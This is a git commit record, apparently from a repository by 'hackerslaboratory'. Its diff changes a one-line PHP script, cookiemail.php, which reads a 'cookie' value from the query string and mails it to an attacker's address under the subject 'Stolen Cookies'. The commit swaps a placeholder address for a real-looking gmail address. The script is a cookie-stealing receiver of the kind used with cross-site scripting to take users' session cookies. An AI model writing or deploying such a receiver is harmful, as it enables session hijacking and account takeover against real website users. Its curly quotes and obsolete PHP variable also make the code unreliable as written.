080e48013859153a7a4f038e00d510d227330b48
hackerslaboratory <75172344+mrkevinpeter@users.noreply.github.com>
2021-03-15 05:45:26 -0700

    Update cookiemail.php

--- 1/cookiemail.php
+++ 1/cookiemail.php
@@ -1,3 +1,3 @@
 <?php
-$cookie = $HTTP_GET_VARS[“cookie”]; mail(“hackerid@mailprovider.com”, “Stolen Cookies”, $cookie); 
+$cookie = $HTTP_GET_VARS[“cookie”]; mail(“hackerslaboratory.yt@gmail.com”, “Stolen Cookies”, $cookie); 
 ?>
